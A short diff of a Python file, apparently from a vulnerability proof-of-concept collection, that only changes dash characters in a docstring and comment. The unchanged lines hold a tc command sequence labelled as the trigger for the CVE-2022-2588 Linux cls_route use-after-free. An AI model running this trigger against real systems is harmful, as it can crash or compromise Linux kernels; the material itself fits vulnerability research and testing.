@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
-"""CVE-2022-2588 — Linux cls_route use-after-free. Zero-click-ish via crafted
+"""CVE-2022-2588 -- Linux cls_route use-after-free. Zero-click-ish via crafted
 tc filter; reachable from a netns. Public PoC. HIGH."""
 import sys
 from pathlib import Path
 
 TC_SCRIPT = r'''
-# cls_route UAF trigger — add then delete a route filter with a dangling handle
+# cls_route UAF trigger -- add then delete a route filter with a dangling handle
 tc qdisc add dev lo root handle 1: htb
 tc filter add dev lo parent 1: handle 0x1 protocol ip prio 1 route to 127.0.0.1
 tc filter del dev lo parent 1: handle 0x1 protocol ip prio 1 route
